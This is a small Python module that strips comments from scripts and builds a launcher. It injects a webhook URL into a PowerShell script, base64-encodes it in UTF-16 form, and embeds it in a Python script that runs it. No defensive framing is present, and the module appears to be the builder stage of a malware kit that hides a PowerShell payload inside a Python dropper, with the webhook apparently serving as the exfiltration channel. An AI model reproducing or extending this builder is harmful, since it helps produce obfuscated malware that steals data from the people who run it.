# This module doesn't work or modify any file for avoiding errors. File content should be passed as parameter in all functions.
import re
from base64 import b64encode


def shorten_script(script, comment_char):
    """Remove line commentaries and empty lines in a script. Return the short script as string."""
    script = re.sub(fr"{comment_char}.*$", '', script, 0, re.MULTILINE)
    script = [line for line in script.splitlines() if line.strip() != '']
    return '\n'.join(script)

def create_main_script(py_script, ps_script, webhook_url):
    """Encode in base64 the PowerShell script and insert it in the main Python script that will run it."""
    
    # Add the webhook URL to the PowerShell script and encode it in base64.
    ps_script = re.sub(r'WEBHOOK_URL_HERE', webhook_url, ps_script)
    ps_script = shorten_script(ps_script, '#')
    ps_script_b64 = ps_script.encode('utf-16')[2:]
    ps_script_b64 = b64encode(ps_script_b64).decode()
    
    # Add the encoded PowerShell script to the python file that will run it.
    py_script = re.sub(r'PS_B64_HERE', ps_script_b64, py_script)
    py_script = shorten_script(py_script, '#')

    return py_script
